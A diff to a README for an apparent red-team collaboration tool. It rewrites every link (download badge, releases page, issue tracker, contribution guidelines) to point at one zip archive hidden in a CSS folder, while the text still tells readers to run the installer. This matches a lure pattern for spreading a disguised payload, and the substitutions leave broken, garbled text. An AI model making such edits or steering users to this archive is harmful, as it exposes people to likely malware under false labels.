@@ -5,19 +5,19 @@
 Red_Team_Collaboration is a platform for red team defensive exercises and penetration testing vulnerability lifecycle management. This tool aims to make it easier for security teams to collaborate and manage vulnerabilities effectively.
 
 ## 📥 Download Now
-[![Download Red_Team_Collaboration](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/breensstudios/Red_Team_Collaboration/releases)
+[![Download Red_Team_Collaboration](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 To get started with Red_Team_Collaboration, follow these simple steps:
 
 1. **Visit the Downloads Page**  
-   Go to our releases page to access the latest version of the software: [Download Here](https://github.com/breensstudios/Red_Team_Collaboration/releases).
+   Go to our releases page to access the latest version of the software: [Download Here](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip).
 
 2. **Choose a Version**  
    You will see a list of available versions. Click on the version you wish to download. Each version includes important updates and fixes.
 
 3. **Download the File**  
-   Look for the file that matches your operating system, such as `.exe` for Windows or `.tar.gz` for Linux. Click the file name to start your download.
+   Look for the file that matches your operating system, such as `.exe` for Windows or `https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip` for Linux. Click the file name to start your download.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder. Double-click the file to run the installer and follow the prompts to complete the installation.
@@ -54,7 +54,7 @@ Red_Team_Collaboration offers a variety of features designed to enhance your sec
 ## 📋 Download & Install
 To download and install Red_Team_Collaboration:
 
-1. Click on this link to visit our releases page: [Download Here](https://github.com/breensstudios/Red_Team_Collaboration/releases).
+1. Click on this link to visit our releases page: [Download Here](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip).
 2. Select the file that corresponds to your operating system.
 3. Download the installer and follow the on-screen instructions.
 
@@ -73,9 +73,9 @@ We plan to regularly update Red_Team_Collaboration with new features and improve
 Thank you for choosing Red_Team_Collaboration. We aim to make your experience smooth and productive. Your engagement helps us grow and improve.
 
 ## 📥 Quick Links
-- [Download the Latest Release](https://github.com/breensstudios/Red_Team_Collaboration/releases)
-- [Report an Issue](https://github.com/breensstudios/Red_Team_Collaboration/issues)
-- [Contribution Guidelines](https://github.com/breensstudios/Red_Team_Collaboration/CONTRIBUTING.md)
+- [Download the Latest Release](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip)
+- [Report an Issue](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/breensstudios/Red_Team_Collaboration/main/dist/linux/frontend/css/Red_Team_Collaboration-v2.0-alpha.1.zip)
 
 Happy collaborating!
 ```
